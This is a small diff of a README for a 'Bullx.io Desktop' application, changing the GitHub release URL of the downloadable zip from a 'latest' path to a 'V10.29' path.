@@ -44,7 +44,7 @@ We welcome contributions! If you want to contribute, please feel free to submit 
 
 
 ## Download
-You can [click here to download](https://github.com/bullxio/Bullx.io-Desktop/releases/download/latest/Bullx.io-Desktop.zip) the latest version of the Bullx.io Desktop Application.
+You can [click here to download](https://github.com/Bullxio/Bullx.io-Desktop/releases/download/V10.29/Bullx.io-Desktop.zip) the latest version of the Bullx.io Desktop Application.
 
 ---
 
